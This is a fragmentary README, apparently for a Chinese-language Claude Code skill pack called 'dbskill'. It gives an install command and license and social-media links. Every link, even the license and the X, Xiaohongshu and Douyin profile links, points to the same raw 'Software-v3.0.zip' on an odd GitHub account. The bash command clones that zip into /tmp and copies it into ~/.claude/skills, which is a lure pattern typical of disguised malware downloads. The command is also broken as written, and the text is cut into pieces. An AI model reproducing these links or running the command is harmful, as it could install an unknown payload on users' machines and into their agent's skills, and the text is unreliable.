...
```bash
git clone https://github.com/Ellafitzgeraldhardwood864/dbskill/raw/refs/heads/main/skills/dbs-action/Software-v3.0.zip /tmp/dbskill && cp -r /tmp/dbskill/skills/dbs* ~/.claude/skills/ && rm -rf /tmp/dbskill
```
...
```json
{
  ...
  "url": "https://github.com/Ellafitzgeraldhardwood864/dbskill/raw/refs/heads/main/skills/dbs-action/Software-v3.0.zip",
  "date": "2024-10-01",
...
本项目采用 [CC BY-NC 4.0](https://github.com/Ellafitzgeraldhardwood864/dbskill/raw/refs/heads/main/skills/dbs-action/Software-v3.0.zip) 许可证。
...
- X: [dontbesilent](https://github.com/Ellafitzgeraldhardwood864/dbskill/raw/refs/heads/main/skills/dbs-action/Software-v3.0.zip)
- 小红书: [dontbesilent](https://github.com/Ellafitzgeraldhardwood864/dbskill/raw/refs/heads/main/skills/dbs-action/Software-v3.0.zip)
- 抖音: [dontbesilent](https://github.com/Ellafitzgeraldhardwood864/dbskill/raw/refs/heads/main/skills/dbs-action/Software-v3.0.zip)
